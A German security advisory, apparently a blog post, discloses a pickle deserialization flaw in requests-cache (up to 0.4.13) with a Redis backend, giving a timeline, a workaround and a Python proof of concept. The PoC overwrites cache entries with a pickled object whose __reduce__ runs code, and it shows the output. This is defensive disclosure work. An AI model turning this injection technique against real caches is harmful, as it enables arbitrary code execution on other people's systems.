---
title: Sicherheitslücke in requests-cache
author: Simon Biewald
description: Eine Sicherheitslücke in requests-cache erlaubt Codeausführung.
subject: requests-cache, Sicherheit, Python
date: 2018-01-26
---

# Sicherheitslücke in requests-cache

In `requests-cache` ist bis einschließlich in 
der aktuellen Version (Stand: 2018-01-29) 0.4.13 eine Sicherheitslücke, 
die unter Umständen die Ausführung beliebiger
Befehle ermöglicht.

`requests-cache` ermöglicht das Zwischenspeichern von Anworten auf Netzwerkanfragen der 
Python-Bibliothek `requests`. Die Antworten werden mit `pickle` serialisiert. Da die 
serialisierten Daten auf möglicherweise nicht vertrauenswürdigen Netzwerkorten
abgelegt werden, können, sofern Schreibzugriff auf diese besteht, spezielle 
Daten auf diesen abgelegt werden, welche von `requests-cache` wieder geladen und
ausgeführt werden.

Konkret kann die Sicherheitslücke ausgenutzt werden, wenn als Cache-Backend `redis`
verwendet wird und auf den Rediscache zugegriffen werden kann. Dazu kommt, dass
`requests-cache` nicht die Verwendung eines Passworts mit Redis ermöglicht.

Dieses könnte genauso für die Benutzung von MongoDB als Cache-Backend gelten.

Links:

 - [requests-cache](https://pypi.python.org/pypi/requests-cache/0.4.13) 
 auf PyPi
 - [reclosedev/requests-cache](https://github.com/reclosedev/requests-cache/)
 auf GitHub
 
## Historie

 - 14.01.2018: Email an Author; Keine Antwort.
 - 26.01.2018: Issue auf GitHub mit genauer Beschreibung und Proof-of-Concept

## Fix

Noch kein offizieller Fix verfügbar.

### Workaround

Durch die Verwendung des `memory`-Backends (Fallback wenn `sqlite` nicht verfügbar) 
bzw. des `sqlite`-Backends (Standard) mit sicheren Zugriffsrechten ist es möglich 
diese Sicherheitslücke zu vermeiden.

## Proof-of-Concept

Vorraussetzung:

 - Redis auf `localhost:6379`
 - Python3 mit `requests`, `requests-cache<=0.4.13`


<pre class="language-python line-numbers">
<code>import requests
import requests_cache

requests_cache.install_cache(cache_name='cache',backend='redis')
requests_cache.clear()

print("Cachezugriff I.")
response = requests.get("https://example.org")


### Angreifer
print('Angreifer: Setzen des Exploits')
from redis import StrictRedis as Redis
from requests_cache.backends.storage.redisdict import RedisDict

rd = Redis()

class Exploit:
    def __reduce__(self):
        return (print, ("I won.",))

import pickle

exploit = pickle.dumps(Exploit(), protocol=0)

for key in rd.hgetall("cache:responses").keys():
    rd.hset("cache:responses", key, exploit)

print('Angreifer: Ende')
### Angreifer Ende

print("Cachezugriff II. (Exploit)")
response = requests.get("https://example.org")</code></pre>

### Ausgabe

Die Fehlermeldung entsteht dardurch, das der Proof-of-Concept-Exploit nicht besonders 
ausgereift ist.

```python
Cachezugriff I.
Angreifer: Setzen des Exploits
Angreifer: Ende
Cachezugriff II. (Exploit)
I won.
I won.
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/simon/.local/lib/python3.6/site-packages/requests/api.py", line 72, in get
    return request('get', url, params=params, **kwargs)
  File "/home/simon/.local/lib/python3.6/site-packages/requests/api.py", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File "/home/simon/.local/lib/python3.6/site-packages/requests_cache/core.py", line 126, in request
    **kwargs
  File "/home/simon/.local/lib/python3.6/site-packages/requests/sessions.py", line 508, in request
    resp = self.send(prep, **send_kwargs)
  File "/home/simon/.local/lib/python3.6/site-packages/requests_cache/core.py", line 97, in send
    response, timestamp = self.cache.get_response_and_time(cache_key)
  File "/home/simon/.local/lib/python3.6/site-packages/requests_cache/backends/base.py", line 72, in get_response_and_time
    response, timestamp = self.responses[key]
TypeError: 'NoneType' object is not iterable
```

